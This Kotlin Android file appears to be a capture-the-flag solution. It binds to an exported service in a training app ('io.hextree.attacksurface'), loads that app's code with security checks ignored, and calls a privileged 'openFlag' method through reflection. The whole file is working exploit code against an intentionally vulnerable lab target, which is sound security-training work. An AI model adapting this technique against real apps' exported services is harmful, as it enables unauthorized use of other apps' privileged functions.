package com.pachinko.intentattacksurface

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import androidx.activity.ComponentActivity

class Flag28Activity : ComponentActivity() {
    val mConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            Log.d("Flag28Activity", "Connected")
            val classLoader = this@Flag28Activity.createPackageContext(
                "io.hextree.attacksurface",
                Context.CONTEXT_INCLUDE_CODE or Context.CONTEXT_IGNORE_SECURITY).classLoader
            val iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface")

            for (innerClass in iRemoteServiceClass.declaredClasses) {
                if (innerClass.simpleName == "Stub") {
                    Log.d("Flag28Activity", "Finding stub..")
                    val asInterfaceMethod = innerClass.getDeclaredMethod("asInterface", IBinder::class.java)
                    val iRemoteService = asInterfaceMethod.invoke(null, service)
                    Log.d("Flag28Activity", "Interface object: $iRemoteService")
                    
                    val openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag")
                    openFlagMethod.invoke(iRemoteService)
                    Log.d("Flag28Activity", "Flag opened successfully")
                    break
                }
            }
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            TODO("Not yet implemented")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag28Service"
            )
        }
        bindService(intent, mConnection, BIND_AUTO_CREATE)
    }
}